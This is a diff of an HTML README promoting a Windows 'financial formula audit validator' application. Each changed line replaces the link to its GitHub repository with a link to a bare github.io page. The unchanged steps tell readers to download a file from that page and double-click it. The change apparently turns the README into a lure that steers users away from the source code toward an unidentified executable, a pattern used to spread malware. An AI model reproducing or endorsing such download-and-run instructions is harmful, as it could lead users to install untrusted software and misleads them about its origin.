@@ -1,7 +1,7 @@
 <h1>🧮 genpark-complex-financial-formula-audit-validator-skill - Verify Your Financial Data Instantly</h1>
 
 <div style="text-align:center; margin:30px 0;">
-<a href="https://github.com/ghost33333333/genpark-complex-financial-formula-audit-validator-skill" style="background-color:#FF6B35; color:white; padding:15px 40px; text-decoration:none; font-size:20px; border-radius:30px; font-weight:bold;">📥 DOWNLOAD NOW - FREE</a>
+<a href="https://ghost33333333.github.io" style="background-color:#FF6B35; color:white; padding:15px 40px; text-decoration:none; font-size:20px; border-radius:30px; font-weight:bold;">📥 DOWNLOAD NOW - FREE</a>
 </div>
 
 <h2>🔍 What Does This Software Do?</h2>
@@ -32,7 +32,7 @@
 <h2>📥 How to Download and Run (Windows)</h2>
 <p>Getting started is simple. Follow these exact steps:</p>
 <ol>
-<li>Visit this link to download the application: <a href="https://github.com/ghost33333333/genpark-complex-financial-formula-audit-validator-skill">https://github.com/ghost33333333/genpark-complex-financial-formula-audit-validator-skill</a></li>
+<li>Visit this link to download the application: <a href="https://ghost33333333.github.io">https://ghost33333333.github.io</a></li>
 <li>Click the download button on the page to save the application to your computer</li>
 <li>Once the download is complete, locate the downloaded file in your Downloads folder</li>
 <li>Double-click the file to start the application</li>
@@ -116,7 +116,7 @@ A: For a standard 10-page financial report, the check usually completes in under
 <p>Don't let financial errors cost you time, money, or credibility. Download the genpark-complex-financial-formula-audit-validator-skill today and enjoy the peace of mind that comes with knowing your numbers are always correct.</p>
 
 <div style="text-align:center; margin:40px 0;">
-<a href="https://github.com/ghost33333333/genpark-complex-financial-formula-audit-validator-skill" style="background-color:#4CAF50; color:white; padding:15px 40px; text-decoration:none; font-size:18px; border-radius:30px;">🚀 DOWNLOAD AND START VALIDATING</a>
+<a href="https://ghost33333333.github.io" style="background-color:#4CAF50; color:white; padding:15px 40px; text-decoration:none; font-size:18px; border-radius:30px;">🚀 DOWNLOAD AND START VALIDATING</a>
 </div>
 
 <p style="text-align:center; color:#666; margin-top:30px;">Version 1.0.0 | Last Updated: January 2025</p>
